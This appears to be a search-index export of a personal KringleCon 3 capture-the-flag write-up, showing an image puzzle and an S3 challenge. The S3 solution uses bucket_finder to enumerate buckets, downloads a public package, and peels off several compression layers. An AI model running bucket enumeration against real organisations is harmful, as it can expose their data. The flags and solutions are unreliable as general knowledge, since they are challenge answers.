{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"[Write-up] Kringlecon3: French Hens Kringlecon is here; it's the most wonderful time of the year! In this site, you'll find my write-ups for approaching the Kringlecon 3 objectives, which may devolve into a stream of consciousness exercise as the objectives get more challenging. Thank you to the SANS Institute and Counter Hack for running this holiday-themed security conference! This year was my first time attending and will most definitely not be my last.","title":"Home"},{"location":"#write-up-kringlecon3-french-hens","text":"Kringlecon is here; it's the most wonderful time of the year! In this site, you'll find my write-ups for approaching the Kringlecon 3 objectives, which may devolve into a stream of consciousness exercise as the objectives get more challenging. Thank you to the SANS Institute and Counter Hack for running this holiday-themed security conference! This year was my first time attending and will most definitely not be my last.","title":"[Write-up] Kringlecon3: French Hens"},{"location":"challenges/01-uncover-santas-gift-list/","text":"Challenge 01 - Uncover Santa's Gift List Challenge Difficulty: 1/5 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice. Solution Step 01 Download the billboard image: Step 02 Use a photo editing tool to untwirl the twirled region Flag proxmark","title":"Objective 01"},{"location":"challenges/01-uncover-santas-gift-list/#challenge-01-uncover-santas-gift-list","text":"","title":"Challenge 01 - Uncover Santa's Gift List"},{"location":"challenges/01-uncover-santas-gift-list/#challenge","text":"Difficulty: 1/5 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.","title":"Challenge"},{"location":"challenges/01-uncover-santas-gift-list/#solution","text":"","title":"Solution"},{"location":"challenges/01-uncover-santas-gift-list/#step-01","text":"Download the billboard image:","title":"Step 01"},{"location":"challenges/01-uncover-santas-gift-list/#step-02","text":"Use a photo editing tool to untwirl the twirled region","title":"Step 02"},{"location":"challenges/01-uncover-santas-gift-list/#flag","text":"proxmark","title":"Flag"},{"location":"challenges/02-investigate-s3-bucket/","text":"Challenge 02 - Investigate S3 Bucket Challenge Difficulty: 1/5 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Shell Can you help me? Santa has been experimenting with new wrapping technology, and we've run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it's been! Except I don't remember where, and the Wrapper3000 is on the fritz! Can you find the missing package, and unwrap it all the way? Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. elf@3d3d22528c9f:~$ ls -alt total 28 drwxr-xr-x 1 elf elf 4096 Dec 17 13:08 . drwxr-xr-x 1 elf elf 4096 Dec 17 13:08 bucket_finder drwxr-xr-x 1 root root 4096 Dec 16 18:13 .. -rwxr-xr-x 1 elf elf 90 Dec 5 00:00 .bashrc -rw-r--r-- 1 elf elf 179 Dec 5 00:00 TIPS -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile Solution Step 01 cd into bucket_finder and view the following existing wordlist: kringlecastle wrapper santa Step 02 Run bucket_finder on the wordlist to see the results elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa elf@3d3d22528c9f:~/bucket_finder$ Step 03 Adjust the wordlist to include terms associated with Wrapper3000 : kringlecastle wrapper santa Wrapper 3000 Wrapper3000 wrapper3000 Step 04 Run bucket_finder on the new wordlist elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa http://s3.amazonaws.com/Wrapper http://s3.amazonaws.com/3000 Bucket does not exist: 3000 http://s3.amazonaws.com/Wrapper3000 Bucket does not exist: Wrapper3000 http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package elf@3d3d22528c9f:~/bucket_finder$ Step 05 Download the public bucket elf@3d3d22528c9f:~/bucket_finder$ printf \"wrapper3000\" > found.txt elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb --download found.txt http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Downloaded> http://s3.amazonaws.com/wrapper3000/package elf@3d3d22528c9f:~/bucket_finder$ Step 06 View downloaded resources elf@3d3d22528c9f:~/bucket_finder$ ls -alt total 44 drwxr-xr-x 2 elf elf 4096 Dec 29 18:49 wrapper3000 drwxr-xr-x 1 elf elf 4096 Dec 29 18:49 . -rw-r--r-- 1 elf elf 11 Dec 29 18:49 found.txt drwxr-xr-x 1 elf elf 4096 Dec 29 18:47 .. -rw-r--r-- 1 elf elf 65 Dec 29 18:47 wordlist -rwxr-xr-x 1 elf elf 9121 Dec 17 13:08 bucket_finder.rb -rw-r--r-- 1 elf elf 2550 Dec 5 00:00 README elf@3d3d22528c9f:~/bucket_finder$ cd wrapper3000/ elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ ls -alt total 16 drwxr-xr-x 2 elf elf 4096 Dec 29 18:49 . -rw-r--r-- 1 elf elf 829 Dec 29 18:49 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:49 .. elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ file package package: ASCII text, with very long lines elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ cat package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA Step 07 Piping the ASCII into a base64 decoder and dumping the hex, we can see that the package is a heavily zipped file; the file signature is 50 4b 03 04 for PK.. : elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package | base64 -d | hexdump -C 00000000 50 4b 03 04 0a 00 00 00 00 00 80 30 84 51 1b 45 |PK.........0.Q.E| 00000010 3f 1a 9f 01 00 00 9f 01 00 00 1c 00 1c 00 70 61 |?.............pa| 00000020 63 6b 61 67 65 2e 74 78 74 2e 5a 2e 78 7a 2e 78 |ckage.txt.Z.xz.x| 00000030 78 64 2e 74 61 72 2e 62 7a 32 55 54 09 00 03 a0 |xd.tar.bz2UT....| 00000040 17 ca 5f a0 17 ca 5f 75 78 0b 00 01 04 f6 01 00 |.._..._ux.......| 00000050 00 04 14 00 00 00 42 5a 68 39 31 41 59 26 53 59 |......BZh91AY&SY| 00000060 da 4b 62 bf 00 01 1e ff 90 de 10 12 80 64 a7 ff |.Kb..........d..| 00000070 f0 2f 07 10 f0 7f fc 5e d2 04 00 00 08 30 01 59 |./.....^.....0.Y| 00000080 a4 61 14 ca 7b 53 d5 33 d5 34 7a 43 20 da 9a 00 |.a..{S.3.4zC ...| 00000090 00 01 a0 3d 43 d4 1a a7 a1 84 23 12 81 a0 68 00 |...=C.....#...h.| 000000a0 3d 4d 34 00 00 03 21 26 26 94 79 40 68 34 6d 23 |=M4...!&&.y@h4m#| 000000b0 d4 fd 50 34 7a 8f 48 68 7a 81 93 1c 36 61 92 b6 |..P4z.Hhz...6a..| 000000c0 35 40 12 39 e8 03 23 3c 0c 5c c1 c1 08 50 02 80 |5@.9..#<.\\...P..| 000000d0 81 2f 43 62 6b 83 c5 79 d2 d0 e3 87 ad 4f b7 74 |./Cbk..y.....O.t| 000000e0 3c 0a 68 29 14 5b a7 73 52 29 ba 2f 92 aa c6 01 |<.h).[.sR)./....| 000000f0 d3 83 3f 81 62 8a 73 45 6c d8 35 e4 cd e2 66 8a |..?.b.sEl.5...f.| 00000100 4b 48 36 a8 e8 dc 98 ca 00 0e 1d 2e 02 ed 3c dd |KH6...........<.| 00000110 79 a0 00 cb 7b cd 2d 9d f2 c6 5e 12 16 68 93 22 |y...{.-...^..h.\"| 00000120 11 e4 97 f7 dd ae c6 87 51 27 a1 00 cc 81 73 a9 |........Q'....s.| 00000130 26 d6 b6 73 6a 09 31 03 30 bf 40 2b b1 c7 4b 3c |&..sj.1.0.@+..K<| 00000140 b2 05 82 b0 08 50 55 26 1d 7b 4f ad fa 6b a6 20 |.....PU&.{O..k. | 00000150 ca 35 f4 78 4d 08 b0 26 e3 70 19 11 3e 09 0a cf |.5.xM..&.p..>...| 00000160 aa b4 a2 46 f5 b1 68 9c 31 a9 32 d8 c8 2c ab 0d |...F..h.1.2..,..| 00000170 a7 52 6e 5a c8 f1 d4 78 89 2d 9c 12 2f 92 25 16 |.RnZ...x.-../.%.| 00000180 c5 81 22 46 ce 67 14 e3 3c 31 39 3c 4a 2b 55 ee |..\"F.g..<19<J+U.| 00000190 57 31 38 ab 2d d9 07 9d 4b 16 7c e7 57 1e 0d 07 |W18.-...K.|.W...| 000001a0 b1 b0 bb 09 dc 2f 3d 67 f8 10 e9 79 fa 28 12 aa |...../=g...y.(..| 000001b0 16 c2 b2 4e 46 aa 3b ed 45 82 62 26 b4 72 a8 26 |...NF.;.E.b&.r.&| 000001c0 43 1c b5 dd 81 f4 99 1c c2 f3 2b fa 15 88 11 c2 |C.........+.....| 000001d0 10 8c 06 46 85 22 98 34 fc 47 24 5a 89 de dd f6 |...F.\".4.G$Z....| 000001e0 56 38 27 fc e1 9d 40 98 88 1e fe 2e e4 8a 70 a1 |V8'...@.......p.| 000001f0 21 b4 96 c5 7e 50 4b 01 02 1e 03 0a 00 00 00 00 |!...~PK.........| 00000200 00 80 30 84 51 1b 45 3f 1a 9f 01 00 00 9f 01 00 |..0.Q.E?........| 00000210 00 1c 00 18 00 00 00 00 00 00 00 00 00 a4 81 00 |................| 00000220 00 00 00 70 61 63 6b 61 67 65 2e 74 78 74 2e 5a |...package.txt.Z| 00000230 2e 78 7a 2e 78 78 64 2e 74 61 72 2e 62 7a 32 55 |.xz.xxd.tar.bz2U| 00000240 54 05 00 03 a0 17 ca 5f 75 78 0b 00 01 04 f6 01 |T......_ux......| 00000250 00 00 04 14 00 00 00 50 4b 05 06 00 00 00 00 01 |.......PK.......| 00000260 00 01 00 62 00 00 00 f5 01 00 00 00 00 |...b.........| 0000026d elf@b6192a3b2430:~/bucket_finder/wrapper3000$ Step 08 Base64 decode package to a new file decoded and unzip elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package | base64 -d > decoded elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded decoded: Zip archive data, at least v1.0 to extract elf@b6192a3b2430:~/bucket_finder/wrapper3000$ unzip decoded Archive: decoded extracting: package.txt.Z.xz.xxd.tar.bz2 Step 09 Keep unzipping and decoding using the proper utility commands until we get package.txt elf@b6192a3b2430:~/bucket_finder/wrapper3000$ tar -xf package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 28 drwxr-xr-x 2 elf elf 4096 Dec 29 19:17 . -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package.txt.Z.xz.xxd 00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101 .7zXZ......F..!. 00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede ....t/....,...N. 00000020: c8a1 8306 0494 376c cae8 0041 054d 1910 ......7l...A.M.. 00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d F...C'M......... 00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6 ..E..D.......).. 00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d d..$..E-.RW....} 00000060: 0100 0000 0004 595a ......YZ elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xxd -r package.txt.Z.xz.xxd decoded2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: XZ compressed data elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xz --decompress decoded2 xz: decoded2: Filename has an unknown suffix, skipping elf@b6192a3b2430:~/bucket_finder/wrapper3000$ mv decoded2 decoded2.xz elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xz --decompress decoded2.xz elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 32 drwxr-xr-x 2 elf elf 4096 Dec 29 19:25 . -rw-r--r-- 1 elf elf 45 Dec 29 19:24 decoded2 -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: compress'd data 16 bits elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat decoded2 | hexdump -C 00000000 1f 9d 90 4e de c8 a1 83 06 04 94 37 6c ca e8 00 |...N.......7l...| 00000010 41 05 4d 19 10 46 e4 bc 99 43 27 4d 19 8a 06 d9 |A.M..F...C'M....| 00000020 84 19 f3 f0 8d 1b 10 45 c2 0c 44 a3 00 |.......E..D..| 0000002d elf@b6192a3b2430:~/bucket_finder/wrapper3000$ mv decoded2 decoded2.Z elf@b6192a3b2430:~/bucket_finder/wrapper3000$ uncompress decoded2.Z elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 32 drwxr-xr-x 2 elf elf 4096 Dec 29 19:31 . -rw-r--r-- 1 elf elf 41 Dec 29 19:24 decoded2 -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: ASCII text elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat decoded2 North Pole: The Frostiest Place on Earth elf@b6192a3b2430:~/bucket_finder/wrapper3000$ Flag North Pole: The Frostiest Place on Earth","title":"Objective 02"},{"location":"challenges/02-investigate-s3-bucket/#challenge-02-investigate-s3-bucket","text":"","title":"Challenge 02 - Investigate S3 Bucket"},{"location":"challenges/02-investigate-s3-bucket/#challenge","text":"Difficulty: 1/5 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.","title":"Challenge"},{"location":"challenges/02-investigate-s3-bucket/#shell","text":"Can you help me? Santa has been experimenting with new wrapping technology, and we've run into a ribbon-curling nightmare! We store our essential data assets in the cloud, and what a joy it's been! Except I don't remember where, and the Wrapper3000 is on the fritz! Can you find the missing package, and unwrap it all the way? Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. elf@3d3d22528c9f:~$ ls -alt total 28 drwxr-xr-x 1 elf elf 4096 Dec 17 13:08 . drwxr-xr-x 1 elf elf 4096 Dec 17 13:08 bucket_finder drwxr-xr-x 1 root root 4096 Dec 16 18:13 .. -rwxr-xr-x 1 elf elf 90 Dec 5 00:00 .bashrc -rw-r--r-- 1 elf elf 179 Dec 5 00:00 TIPS -rw-r--r-- 1 elf elf 220 Apr 18 2019 .bash_logout -rw-r--r-- 1 elf elf 807 Apr 18 2019 .profile","title":"Shell"},{"location":"challenges/02-investigate-s3-bucket/#solution","text":"","title":"Solution"},{"location":"challenges/02-investigate-s3-bucket/#step-01","text":"cd into bucket_finder and view the following existing wordlist: kringlecastle wrapper santa","title":"Step 01"},{"location":"challenges/02-investigate-s3-bucket/#step-02","text":"Run bucket_finder on the wordlist to see the results elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa elf@3d3d22528c9f:~/bucket_finder$","title":"Step 02"},{"location":"challenges/02-investigate-s3-bucket/#step-03","text":"Adjust the wordlist to include terms associated with Wrapper3000 : kringlecastle wrapper santa Wrapper 3000 Wrapper3000 wrapper3000","title":"Step 03"},{"location":"challenges/02-investigate-s3-bucket/#step-04","text":"Run bucket_finder on the new wordlist elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa http://s3.amazonaws.com/Wrapper http://s3.amazonaws.com/3000 Bucket does not exist: 3000 http://s3.amazonaws.com/Wrapper3000 Bucket does not exist: Wrapper3000 http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Public> http://s3.amazonaws.com/wrapper3000/package elf@3d3d22528c9f:~/bucket_finder$","title":"Step 04"},{"location":"challenges/02-investigate-s3-bucket/#step-05","text":"Download the public bucket elf@3d3d22528c9f:~/bucket_finder$ printf \"wrapper3000\" > found.txt elf@3d3d22528c9f:~/bucket_finder$ ./bucket_finder.rb --download found.txt http://s3.amazonaws.com/wrapper3000 Bucket Found: wrapper3000 ( http://s3.amazonaws.com/wrapper3000 ) <Downloaded> http://s3.amazonaws.com/wrapper3000/package elf@3d3d22528c9f:~/bucket_finder$","title":"Step 05"},{"location":"challenges/02-investigate-s3-bucket/#step-06","text":"View downloaded resources elf@3d3d22528c9f:~/bucket_finder$ ls -alt total 44 drwxr-xr-x 2 elf elf 4096 Dec 29 18:49 wrapper3000 drwxr-xr-x 1 elf elf 4096 Dec 29 18:49 . -rw-r--r-- 1 elf elf 11 Dec 29 18:49 found.txt drwxr-xr-x 1 elf elf 4096 Dec 29 18:47 .. -rw-r--r-- 1 elf elf 65 Dec 29 18:47 wordlist -rwxr-xr-x 1 elf elf 9121 Dec 17 13:08 bucket_finder.rb -rw-r--r-- 1 elf elf 2550 Dec 5 00:00 README elf@3d3d22528c9f:~/bucket_finder$ cd wrapper3000/ elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ ls -alt total 16 drwxr-xr-x 2 elf elf 4096 Dec 29 18:49 . -rw-r--r-- 1 elf elf 829 Dec 29 18:49 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:49 .. elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ file package package: ASCII text, with very long lines elf@3d3d22528c9f:~/bucket_finder/wrapper3000$ cat package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAABCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmiktINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0IsCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6Xn6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAAgDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAABQSwUGAAAAAAEAAQBiAAAA9QEAAAAA","title":"Step 06"},{"location":"challenges/02-investigate-s3-bucket/#step-07","text":"Piping the ASCII into a base64 decoder and dumping the hex, we can see that the package is a heavily zipped file; the file signature is 50 4b 03 04 for PK.. : elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package | base64 -d | hexdump -C 00000000 50 4b 03 04 0a 00 00 00 00 00 80 30 84 51 1b 45 |PK.........0.Q.E| 00000010 3f 1a 9f 01 00 00 9f 01 00 00 1c 00 1c 00 70 61 |?.............pa| 00000020 63 6b 61 67 65 2e 74 78 74 2e 5a 2e 78 7a 2e 78 |ckage.txt.Z.xz.x| 00000030 78 64 2e 74 61 72 2e 62 7a 32 55 54 09 00 03 a0 |xd.tar.bz2UT....| 00000040 17 ca 5f a0 17 ca 5f 75 78 0b 00 01 04 f6 01 00 |.._..._ux.......| 00000050 00 04 14 00 00 00 42 5a 68 39 31 41 59 26 53 59 |......BZh91AY&SY| 00000060 da 4b 62 bf 00 01 1e ff 90 de 10 12 80 64 a7 ff |.Kb..........d..| 00000070 f0 2f 07 10 f0 7f fc 5e d2 04 00 00 08 30 01 59 |./.....^.....0.Y| 00000080 a4 61 14 ca 7b 53 d5 33 d5 34 7a 43 20 da 9a 00 |.a..{S.3.4zC ...| 00000090 00 01 a0 3d 43 d4 1a a7 a1 84 23 12 81 a0 68 00 |...=C.....#...h.| 000000a0 3d 4d 34 00 00 03 21 26 26 94 79 40 68 34 6d 23 |=M4...!&&.y@h4m#| 000000b0 d4 fd 50 34 7a 8f 48 68 7a 81 93 1c 36 61 92 b6 |..P4z.Hhz...6a..| 000000c0 35 40 12 39 e8 03 23 3c 0c 5c c1 c1 08 50 02 80 |5@.9..#<.\\...P..| 000000d0 81 2f 43 62 6b 83 c5 79 d2 d0 e3 87 ad 4f b7 74 |./Cbk..y.....O.t| 000000e0 3c 0a 68 29 14 5b a7 73 52 29 ba 2f 92 aa c6 01 |<.h).[.sR)./....| 000000f0 d3 83 3f 81 62 8a 73 45 6c d8 35 e4 cd e2 66 8a |..?.b.sEl.5...f.| 00000100 4b 48 36 a8 e8 dc 98 ca 00 0e 1d 2e 02 ed 3c dd |KH6...........<.| 00000110 79 a0 00 cb 7b cd 2d 9d f2 c6 5e 12 16 68 93 22 |y...{.-...^..h.\"| 00000120 11 e4 97 f7 dd ae c6 87 51 27 a1 00 cc 81 73 a9 |........Q'....s.| 00000130 26 d6 b6 73 6a 09 31 03 30 bf 40 2b b1 c7 4b 3c |&..sj.1.0.@+..K<| 00000140 b2 05 82 b0 08 50 55 26 1d 7b 4f ad fa 6b a6 20 |.....PU&.{O..k. | 00000150 ca 35 f4 78 4d 08 b0 26 e3 70 19 11 3e 09 0a cf |.5.xM..&.p..>...| 00000160 aa b4 a2 46 f5 b1 68 9c 31 a9 32 d8 c8 2c ab 0d |...F..h.1.2..,..| 00000170 a7 52 6e 5a c8 f1 d4 78 89 2d 9c 12 2f 92 25 16 |.RnZ...x.-../.%.| 00000180 c5 81 22 46 ce 67 14 e3 3c 31 39 3c 4a 2b 55 ee |..\"F.g..<19<J+U.| 00000190 57 31 38 ab 2d d9 07 9d 4b 16 7c e7 57 1e 0d 07 |W18.-...K.|.W...| 000001a0 b1 b0 bb 09 dc 2f 3d 67 f8 10 e9 79 fa 28 12 aa |...../=g...y.(..| 000001b0 16 c2 b2 4e 46 aa 3b ed 45 82 62 26 b4 72 a8 26 |...NF.;.E.b&.r.&| 000001c0 43 1c b5 dd 81 f4 99 1c c2 f3 2b fa 15 88 11 c2 |C.........+.....| 000001d0 10 8c 06 46 85 22 98 34 fc 47 24 5a 89 de dd f6 |...F.\".4.G$Z....| 000001e0 56 38 27 fc e1 9d 40 98 88 1e fe 2e e4 8a 70 a1 |V8'...@.......p.| 000001f0 21 b4 96 c5 7e 50 4b 01 02 1e 03 0a 00 00 00 00 |!...~PK.........| 00000200 00 80 30 84 51 1b 45 3f 1a 9f 01 00 00 9f 01 00 |..0.Q.E?........| 00000210 00 1c 00 18 00 00 00 00 00 00 00 00 00 a4 81 00 |................| 00000220 00 00 00 70 61 63 6b 61 67 65 2e 74 78 74 2e 5a |...package.txt.Z| 00000230 2e 78 7a 2e 78 78 64 2e 74 61 72 2e 62 7a 32 55 |.xz.xxd.tar.bz2U| 00000240 54 05 00 03 a0 17 ca 5f 75 78 0b 00 01 04 f6 01 |T......_ux......| 00000250 00 00 04 14 00 00 00 50 4b 05 06 00 00 00 00 01 |.......PK.......| 00000260 00 01 00 62 00 00 00 f5 01 00 00 00 00 |...b.........| 0000026d elf@b6192a3b2430:~/bucket_finder/wrapper3000$","title":"Step 07"},{"location":"challenges/02-investigate-s3-bucket/#step-08","text":"Base64 decode package to a new file decoded and unzip elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package | base64 -d > decoded elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded decoded: Zip archive data, at least v1.0 to extract elf@b6192a3b2430:~/bucket_finder/wrapper3000$ unzip decoded Archive: decoded extracting: package.txt.Z.xz.xxd.tar.bz2","title":"Step 08"},{"location":"challenges/02-investigate-s3-bucket/#step-09","text":"Keep unzipping and decoding using the proper utility commands until we get package.txt elf@b6192a3b2430:~/bucket_finder/wrapper3000$ tar -xf package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 28 drwxr-xr-x 2 elf elf 4096 Dec 29 19:17 . -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf elf 468 Dec 4 11:04 package.txt.Z.xz.xxd -rw-r--r-- 1 elf elf 415 Dec 4 11:04 package.txt.Z.xz.xxd.tar.bz2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ cat package.txt.Z.xz.xxd 00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101 .7zXZ......F..!. 00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede ....t/....,...N. 00000020: c8a1 8306 0494 376c cae8 0041 054d 1910 ......7l...A.M.. 00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d F...C'M......... 00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6 ..E..D.......).. 00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d d..$..E-.RW....} 00000060: 0100 0000 0004 595a ......YZ elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xxd -r package.txt.Z.xz.xxd decoded2 elf@b6192a3b2430:~/bucket_finder/wrapper3000$ file decoded2 decoded2: XZ compressed data elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xz --decompress decoded2 xz: decoded2: Filename has an unknown suffix, skipping elf@b6192a3b2430:~/bucket_finder/wrapper3000$ mv decoded2 decoded2.xz elf@b6192a3b2430:~/bucket_finder/wrapper3000$ xz --decompress decoded2.xz elf@b6192a3b2430:~/bucket_finder/wrapper3000$ ls -alt total 32 drwxr-xr-x 2 elf elf 4096 Dec 29 19:25 . -rw-r--r-- 1 elf elf 45 Dec 29 19:24 decoded2 -rw-r--r-- 1 elf elf 621 Dec 29 19:09 decoded -rw-r--r-- 1 elf elf 829 Dec 29 18:55 package drwxr-xr-x 1 elf elf 4096 Dec 29 18:55 .. -rw-r--r-- 1 elf 